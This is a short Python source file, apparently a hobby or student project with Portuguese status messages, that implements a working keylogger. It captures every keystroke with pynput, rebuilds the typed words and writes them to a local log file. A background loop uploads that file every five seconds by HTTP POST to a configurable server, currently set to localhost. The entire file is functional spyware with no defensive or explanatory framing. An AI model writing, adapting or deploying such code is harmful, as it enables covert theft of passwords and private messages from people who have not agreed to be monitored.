from pynput.keyboard import Key, Listener
import time
import requests
import os
import threading

fullLog = ''
words = ''
SERVER_URL = "http://localhost:8000/log"
FILEPATH = "log.txt"
SEND_INTERVAL = 5


def onPress(key):
    global fullLog
    global words
    if key == Key.space:
        words += ' '

    elif key == Key.backspace:
        words = words[:-1]

    elif key == Key.enter:
        fullLog += words + '\n'
        with open("log.txt", "a") as f:
            f.write(fullLog)

        words = ''
        fullLog = ''
    
    else:
        char = f'{key}'
        char = char.replace("'", "")
        words += char
    
    if key == Key.esc:
        return False


def send_file(filepath):
    if not os.path.exists(filepath):
        print("Arquivo não existe:", filepath)
        return False
    try:
        with open(filepath, "rb") as f:
            files = {"file": (os.path.basename(filepath), f)}
            resp = requests.post(SERVER_URL, files=files, timeout=10)
        if resp.status_code == 200:
            print("Enviado com sucesso:", resp.text)
            return True
        else:
            print("Falha no envio:", resp.status_code, resp.text)
            return False
    except Exception as e:
        print("Erro ao enviar:", e)
        return False
    

def create_keylogger():
    with Listener(on_press=onPress) as k_listener:
        k_listener.join()


def main():
    threading.Thread(target=create_keylogger).start()
    while (True):
        send_file(FILEPATH)
        time.sleep(SEND_INTERVAL)

if __name__ == "__main__":
    main()
